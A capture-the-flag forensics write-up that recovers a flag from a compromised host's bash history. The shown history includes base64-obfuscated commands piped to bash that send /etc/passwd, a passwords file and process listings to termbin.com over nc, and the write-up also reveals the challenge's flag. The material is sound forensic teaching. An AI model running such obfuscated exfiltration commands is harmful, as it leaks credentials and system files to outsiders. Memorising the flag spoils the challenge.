# Bash history

## Task

We suspect that one of BB's internal hosts has been compromised. I copied its
~./bash_history file. Maybe, there are some suspicious commands?

File: bash_history

Tags: forensics

## Solution

There is a lot of noise in the file, we can filter that out:

```bash  
$ grep -Ev '^(totp-gen|ssh petr@praha-00[0-9])' bash_history  
```

We notice some `echo BASE64 | base64 -d | bash` which look very suspicious.

```bash  
echo YnJubzAwMQ== | base64 -d  
echo cHMgYXggPiBwcm9jZXNzZXM= | base64 -d | bash  
echo Y2F0IHByb2Nlc3NlcyB8IG5jIHRlcm1iaW4uY29tIDk5OTk= | base64 -d | bash  
echo cm0gcHJvY2Vzc2Vz | base64 -d | bash  
echo bHMgLWwgfCBuYyB0ZXJtYmluLmNvbSA5OTk5 | base64 -d | bash  
echo xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==  
echo ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU  
echo Y2F0IC9ldGMvcGFzc3dkIHwgbmMgdGVybWJpbi5jb20gOTk5OQ== | base64 -d | bash  
echo Y2F0IHBhc3N3b3Jkcy50eHQgfCBuYyB0ZXJtYmluLmNvbSA5OTk5 | base64 -d | bash  
```

There are two echos that don't base64-decode the string. To be on the safe
side of not accidentally copy-pasting the whole line and executing random code
we use python:

```bash  
$ python -c 'from base64 import b64decode as decode;
print(decode("ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU"))'  
$ python -c 'from base64 import b64decode as decode;
print(decode("xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ=="))'  
```

First one throws an exception due to incorrect padding: `binascii.Error:
Incorrect padding`. Second one is just binary and unusable.

But wait! What if we combine those two?

```bash  
$ python -c 'from base64 import b64decode as decode;
print(decode("ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNUxYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ=="))'  
b'echo c3lza3JvbkNURnt0SGV5LXN0MGxlLWFsbC1EYXRhISF9'  
```

This looks like another round of good old base64.

```bash  
$ python -c 'from base64 import b64decode as decode;
print(decode("c3lza3JvbkNURnt0SGV5LXN0MGxlLWFsbC1EYXRhISF9"))'  
b'syskronCTF{tHey-st0le-all-Data!!}'  
```